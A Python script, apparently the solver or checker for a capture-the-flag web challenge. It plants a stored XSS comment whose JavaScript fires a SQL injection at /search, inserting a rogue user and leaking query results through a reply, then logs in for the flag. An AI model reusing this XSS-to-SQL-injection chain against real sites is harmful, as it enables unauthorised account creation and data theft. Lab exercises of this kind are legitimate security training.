#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import base64
import time

s = requests.session()
MOD = str(time.time())

URL = "http://web.loc:1337"
USERNAME = 'aae7d12fd422575c7e9b2914283d7f2403b147f0b11'
PASSWORD = 'aa7658cafcf35ab84e6c81146a9769fe6f396682bc5'
PAYLOAD = f"""
<script>
  fetch("/search", {{
      method: "POST",
      body: "query=" + encodeURIComponent("' OR 1 = 1; INSERT INTO users(username, password, pp_length) VALUES('{USERNAME}{MOD}', '{PASSWORD}{MOD}', 1338);--"),
      headers: {{
          "Content-Type": "application/x-www-form-urlencoded"
      }}
  }})
  .then(e => e.text())
  .then(t => {{
      fetch(window.location.pathname.replace("comment", "reply"), {{
          method: "POST",
          body: "message=" + encodeURIComponent(btoa(btoa(t.replaceAll(' ', '')))),
          headers: {{
              "Content-Type": "application/x-www-form-urlencoded"
          }}
      }})
  }})
</script>
"""

r = s.get(f"http://nginx:80/")

if "pp ranking" not in r.text.lower():
    print('!pp ranking')
    exit(1)


def register(uname, passwd):
    return s.post(f"{URL}/register", data={
        'username': uname,
        'password': passwd.encode().hex(),
    }).status_code < 400


def login(uname, passwd):
    return s.post(f"{URL}/login", data={
        'username': uname,
        'password': passwd.encode().hex(),
    }).status_code < 400


if not login(USERNAME, PASSWORD):
    if not register(USERNAME, PASSWORD):
        print('!register')
        exit(1)

r = s.post(f"{URL}/comment", data={
    'message': base64.b64encode(PAYLOAD.encode())
})

if r.status_code >= 400:
    print('!comment')
    exit(1)

time.sleep(5)
s.get(f"{URL}/logout")

r = s.post(f"{URL}/login", data={
    'username': f'{USERNAME}{MOD}',
    'password': f'{PASSWORD}{MOD}'.encode().hex(),
})

if r.status_code >= 400:
    print('!login')
    exit(1)

if "cr3{" not in r.text:
    print('!flag', r.text)
    exit(1)

exit(0)
